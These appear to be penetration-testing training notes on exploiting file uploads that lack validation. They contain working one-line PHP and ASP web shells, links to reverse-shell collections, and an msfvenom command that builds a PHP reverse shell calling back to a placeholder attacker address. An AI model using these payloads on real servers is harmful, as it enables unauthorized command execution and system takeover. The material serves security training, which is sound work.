### Absent Validation 
The most basic type of file upload vulnerability occurs when the web application `does not have any form of validation filters` on the uploaded files, allowing the upload of any file type by default.

## Web Shells
We can find many excellent web shells online that provide useful features, like directory traversal or file transfer. One good option for `PHP` is [phpbash](https://github.com/Arrexel/phpbash), which provides a terminal-like, semi-interactive web shell. Furthermore, [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) provides a plethora of web shells for different frameworks and languages, which can be found in the `/opt/useful/SecLists/Web-Shells` directory in `PwnBox`.

## Writing Custom Web Shell
```php
<?php system($_REQUEST['cmd']); ?>
```
Web shells are not exclusive to `PHP`, and the same applies to other web frameworks, with the only difference being the functions used to execute system commands. For `.NET` web applications, we can pass the `cmd` parameter with `request('cmd')` to the `eval()` function, and it should also execute the command specified in `?cmd=` and print its output, as follows:
```asp
<% eval request('cmd') %>
```


One reliable reverse shell for `PHP` is the [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell) PHP reverse shell. Furthermore, the same [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) we mentioned earlier also contains reverse shell scripts for various languages and web frameworks, and we can utilize any of them to receive a reverse shell as well.


## Generating Custom Reverse Shell Scripts
```shell-session
$ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```
